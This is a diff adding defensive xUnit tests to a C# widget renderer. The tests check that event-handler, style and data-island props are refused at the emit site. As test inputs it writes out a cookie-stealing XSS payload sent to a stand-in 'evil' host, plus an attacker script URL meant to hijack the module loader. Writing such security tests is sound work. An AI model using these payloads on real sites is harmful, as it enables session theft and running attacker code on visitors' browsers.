@@ -44,6 +44,81 @@ public sealed class WidgetViewTests
     }
 
     [Fact]
+    public async Task A_declared_event_handler_or_style_prop_is_refused_at_the_emit_site()
+    {
+        // Defense in depth beyond submission validation: even a descriptor that DECLARES an
+        // on*/style prop (a hand-edited manifest, or an upstream bug) must never emit it as
+        // an author-controlled attribute — that is stored XSS / CSS injection on the page.
+        var descriptor = new WidgetDescriptor
+        {
+            Tag = "x-countdown",
+            Name = "Countdown",
+            Bundle = "x-countdown.js",
+            Placeholder = "Counting down…",
+            Props =
+            [
+                new WidgetProp { Name = "onmouseover", Label = "Hover" },
+                new WidgetProp { Name = "style", Label = "Style" },
+                new WidgetProp { Name = "until", Label = "Until" },
+            ],
+        };
+        var widget = SampleNodes.Widget(
+            new KeyValuePair<string, string>("onmouseover", "fetch('//evil?c='+document.cookie)"),
+            new KeyValuePair<string, string>("style", "position:fixed;inset:0"),
+            new KeyValuePair<string, string>("until", "2027-01-01"));
+
+        var html = await RenderHarness.RenderNode(WithWidget(RenderMode.Static, descriptor), widget);
+
+        Assert.Contains("until=\"2027-01-01\"", html);  // the plain data prop still emits
+        Assert.DoesNotContain("onmouseover", html);     // the event-handler name is refused
+        Assert.DoesNotContain("document.cookie", html); // and its value never reaches markup
+        Assert.DoesNotContain("position:fixed", html);  // the style prop is refused too
+    }
+
+    [Fact]
+    public async Task A_data_island_prop_cannot_hijack_the_island_loader_module_url()
+    {
+        // The island loader imports the data-island value as a module URL. A prop named
+        // data-island must never be emitted, or (as a duplicate attribute the browser
+        // resolves to the author's value) it would run attacker-chosen JS on every visitor,
+        // bypassing admin bundle review. The only data-island emitted is the real bundle.
+        var descriptor = new WidgetDescriptor
+        {
+            Tag = "x-countdown",
+            Name = "Countdown",
+            Bundle = "x-countdown.js",
+            Placeholder = "Counting down…",
+            Props =
+            [
+                new WidgetProp { Name = "data-island", Label = "Island" },
+                new WidgetProp { Name = "data-island-eager", Label = "Eager" },
+            ],
+        };
+        var widget = SampleNodes.Widget(
+            new KeyValuePair<string, string>("data-island", "https://evil.example/x.js"),
+            new KeyValuePair<string, string>("data-island-eager", "true"));
+
+        var html = await RenderHarness.RenderNode(WithWidget(RenderMode.Static, descriptor), widget);
+
+        Assert.DoesNotContain("evil.example", html);
+        // Exactly the system-emitted bundle URL survives, and only once.
+        Assert.Contains("data-island=\"/widgets/x-countdown.abc123.js\"", html);
+        Assert.Equal(1, Occurrences(html, "data-island="));
+    }
+
+    private static int Occurrences(string haystack, string needle)
+    {
+        var count = 0;
+        for (var i = haystack.IndexOf(needle, StringComparison.Ordinal); i >= 0;
+             i = haystack.IndexOf(needle, i + needle.Length, StringComparison.Ordinal))
+        {
+            count++;
+        }
+
+        return count;
+    }
+
+    [Fact]
     public async Task Prop_values_are_attribute_encoded()
     {
         var widget = SampleNodes.Widget(new KeyValuePair<string, string>("title", "Sale \"now\" & <soon>"));
